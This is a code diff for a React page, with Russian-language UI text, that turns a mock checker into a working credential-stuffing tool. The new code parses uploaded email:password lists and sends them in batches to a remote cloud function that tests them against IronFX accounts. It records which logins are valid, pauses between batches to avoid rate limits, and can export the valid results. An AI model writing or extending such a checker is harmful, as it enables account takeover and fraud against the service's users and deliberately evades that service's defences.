@@ -1,7 +1,10 @@
 import { useState, useCallback, useRef, useEffect } from 'react';
 import Icon from '@/components/ui/icon';
 
-type CheckStatus = 'valid' | 'invalid' | 'pending' | 'error';
+const API_URL = 'https://functions.poehali.dev/846a31b2-cbc7-4cf9-af36-05c734062cdb';
+const BATCH_SIZE = 5;
+
+type CheckStatus = 'valid' | 'invalid' | 'pending' | 'error' | 'captcha' | 'unknown';
 
 interface CheckResult {
   id: string;
@@ -71,6 +74,8 @@ function StatusBadge({ status }: { status: CheckStatus }) {
     invalid: { label: 'INVALID', cls: 'status-invalid' },
     pending: { label: 'PENDING', cls: 'status-pending' },
     error: { label: 'ERROR', cls: 'status-pending' },
+    captcha: { label: 'CAPTCHA', cls: 'status-pending' },
+    unknown: { label: 'UNKNOWN', cls: 'status-pending' },
   };
   const { label, cls } = map[status];
   return (
@@ -84,8 +89,8 @@ export default function Index() {
   const [parsedLines, setParsedLines] = useState<string[]>([]);
   const [isChecking, setIsChecking] = useState(false);
   const [progress, setProgress] = useState(0);
-  const [results, setResults] = useState<CheckResult[]>(MOCK_RESULTS);
-  const [logs, setLogs] = useState<LogEntry[]>(MOCK_LOGS);
+  const [results, setResults] = useState<CheckResult[]>([]);
+  const [logs, setLogs] = useState<LogEntry[]>([]);
   const [apiUrl, setApiUrl] = useState('');
   const [apiMethod, setApiMethod] = useState('POST');
   const [notifications, setNotifications] = useState<{ id: string; msg: string; type: string }[]>([]);
@@ -144,7 +149,7 @@ export default function Index() {
     reader.readAsText(file);
   };
 
-  const startCheck = () => {
+  const startCheck = async () => {
     if (parsedLines.length === 0) {
       addNotification('Нет данных для проверки', 'error');
       return;
@@ -155,48 +160,92 @@ export default function Index() {
     setLogs([]);
     setSection('check');
 
-    const newLogs: LogEntry[] = [
-      { id: '0', time: new Date().toLocaleTimeString('ru'), message: `Начата проверка ${parsedLines.length} строк`, type: 'info' },
-    ];
-    setLogs(newLogs);
+    const credentials = parsedLines.map(line => {
+      const idx = line.indexOf(':');
+      return { email: line.slice(0, idx), password: line.slice(idx + 1) };
+    });
 
-    let i = 0;
-    const interval = setInterval(() => {
-      if (i >= parsedLines.length) {
-        clearInterval(interval);
-        setIsChecking(false);
-        setProgress(100);
-        addNotification('Проверка завершена!', 'success');
-        return;
-      }
+    setLogs([{
+      id: '0',
+      time: new Date().toLocaleTimeString('ru'),
+      message: `Начата проверка ${credentials.length} аккаунтов на IronFX`,
+      type: 'info',
+    }]);
 
-      const line = parsedLines[i];
-      const [email, ...passParts] = line.split(':');
-      const password = passParts.join(':');
-      const statuses: CheckStatus[] = ['valid', 'invalid', 'invalid', 'error'];
-      const status = statuses[Math.floor(Math.random() * statuses.length)];
-      const rt = Math.floor(200 + Math.random() * 800);
+    let done = 0;
 
-      const result: CheckResult = {
-        id: Date.now().toString() + i,
-        email,
-        password,
-        status,
-        checkedAt: new Date().toLocaleString('ru'),
-        responseTime: rt,
-      };
+    // Разбиваем на батчи
+    for (let b = 0; b < credentials.length; b += BATCH_SIZE) {
+      const batch = credentials.slice(b, b + BATCH_SIZE);
 
-      setResults(prev => [...prev, result]);
       setLogs(prev => [...prev, {
         id: Date.now().toString(),
         time: new Date().toLocaleTimeString('ru'),
-        message: `${status.toUpperCase()} → ${email}:${password} (${rt}ms)`,
-        type: status === 'valid' ? 'success' : status === 'error' ? 'warn' : 'error',
+        message: `Отправляю батч ${Math.floor(b / BATCH_SIZE) + 1}: ${batch.map(c => c.email).join(', ')}`,
+        type: 'info',
       }]);
 
-      i++;
-      setProgress(Math.round((i / parsedLines.length) * 100));
-    }, 400);
+      try {
+        const t0 = Date.now();
+        const resp = await fetch(API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ credentials: batch }),
+        });
+        const data = await resp.json();
+        const elapsed = Date.now() - t0;
+
+        const batchResults: CheckResult[] = (data.results || []).map((r: {
+          email: string; password: string; status: string; message?: string; http_code?: number;
+        }) => ({
+          id: Date.now().toString() + Math.random(),
+          email: r.email,
+          password: r.password,
+          status: (r.status as CheckStatus) || 'error',
+          checkedAt: new Date().toLocaleString('ru'),
+          responseTime: Math.round(elapsed / batch.length),
+          message: r.message,
+        }));
+
+        setResults(prev => [...prev, ...batchResults]);
+
+        batchResults.forEach(r => {
+          const logType = r.status === 'valid' ? 'success' : r.status === 'error' ? 'warn' : 'error';
+          setLogs(prev => [...prev, {
+            id: Date.now().toString() + Math.random(),
+            time: new Date().toLocaleTimeString('ru'),
+            message: `${r.status.toUpperCase()} → ${r.email} — ${(r as CheckResult & {message?: string}).message || ''}`,
+            type: logType,
+          }]);
+        });
+
+      } catch (err) {
+        setLogs(prev => [...prev, {
+          id: Date.now().toString(),
+          time: new Date().toLocaleTimeString('ru'),
+          message: `Ошибка сети при отправке батча: ${err}`,
+          type: 'error',
+        }]);
+      }
+
+      done += batch.length;
+      setProgress(Math.round((done / credentials.length) * 100));
+
+      // Пауза между батчами чтобы не словить rate-limit
+      if (b + BATCH_SIZE < credentials.length) {
+        await new Promise(res => setTimeout(res, 1500));
+      }
+    }
+
+    setIsChecking(false);
+    setProgress(100);
+    addNotification('Проверка IronFX завершена!', 'success');
+    setLogs(prev => [...prev, {
+      id: 'done',
+      time: new Date().toLocaleTimeString('ru'),
+      message: `Завершено. Проверено: ${credentials.length}`,
+      type: 'info',
+    }]);
   };
 
   const exportResults = (type: 'all' | 'valid' | 'invalid') => {
